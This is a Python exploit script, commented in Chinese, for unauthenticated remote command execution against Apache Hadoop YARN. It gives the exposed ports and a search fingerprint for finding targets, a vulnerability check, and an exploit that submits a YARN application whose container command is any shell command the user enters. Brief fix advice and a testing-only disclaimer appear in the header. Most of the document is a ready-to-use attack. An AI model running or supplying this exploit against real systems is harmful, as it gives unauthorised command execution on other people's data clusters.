#   hardoop yarn 未授权rce
#   影响版本： 未知
#   该漏洞常见于开放8088,50070,19888等端口
#   指纹 app="APACHE-hadoop-YARN"
#	修复建议：
#		1. 对访问ip进行规则限制，或关闭对外网访问
#		2. 升级hardoop至带有认证机制的版本
#
#	声明：本脚本仅用于测试以及修复漏洞使用，利用其进行恶意行为产生的后果一切由使用者个人承担
#
import requests
import time
headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'}


def poc(target):
	url=target+'cluster'
	re=requests.get(url,headers=headers)
	print(url,re.status_code)
	if re.status_code==200:
		time.sleep(3)
		url=target+'ws/v1/cluster/apps/new-application'
		re=requests.get(url,headers=headers)
		print(url,re.status_code)
		
		if re.status_code==500:
			print()
			print("[+] Vulnerability seems to exist\n")
		else:
			print("[+] Vulnerability seems to not exist\n")
	else:
		print("[+] Vulnerability seems to not exist\n")


def exp(target,cmd):
	url = target + 'ws/v1/cluster/apps/new-application'
	resp = requests.post(url,headers=headers)
	app_id = resp.json()['application-id']
	url = target + 'ws/v1/cluster/apps'
	data = {
		'application-id': app_id,
		'application-name': '',
		'am-container-spec': {
			'commands': {
				'command': cmd,
			},
		},
		'application-type': 'YARN',
	}
	requests.post(url, json=data,headers=headers)
	print("[+] Execution completed\n")
	
if __name__=="__main__":
	target=input("输入目标地址(http://ip or domain:port/)：\n")
	flag=input("是否测试漏洞是否存在?(y/n):\n")
	if flag=='y':
		poc(target)
	cmd=input("输入你要执行的系统命令\n")
	exp(target,cmd)
